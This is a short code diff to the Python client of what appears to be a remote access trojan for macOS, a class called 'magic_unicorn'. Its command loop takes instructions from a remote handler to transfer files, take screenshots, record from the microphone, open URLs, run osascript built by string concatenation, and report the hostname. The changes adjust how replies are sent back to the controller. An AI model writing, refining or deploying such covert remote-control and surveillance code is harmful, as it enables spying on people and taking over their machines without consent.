@@ -117,6 +117,7 @@ class magic_unicorn:
 
     def openurl(self, url):
         browser.open(url)
+        self.handler.send("".encode("UTF-8"))
 
     def execute_osascript(self, script):
         script = "osascript -e '" + script + "'"
@@ -204,10 +205,8 @@ class magic_unicorn:
                     self.handler.send(platform.node().encode("UTF-8"))
                 elif command[0] == "download":
                     self.upload(command[1])
-                    self.handler.send("noreply".encode("UTF-8"))
                 elif command[0] == "upload":
                     self.download(command[1])
-                    self.handler.send("noreply".encode("UTF-8"))
                 elif command[0] == "screenshot":
                     self.screenshot()
                 elif command[0] == "mic":
@@ -219,7 +218,6 @@ class magic_unicorn:
                     break
                 elif command[0] == "openurl":
                     self.openurl(command[1])
-                    self.handler.send("noreply".encode("UTF-8"))
                 elif command[0] == "chdir":
                     self.chdir(command[1])
                 elif command[0] == "say":
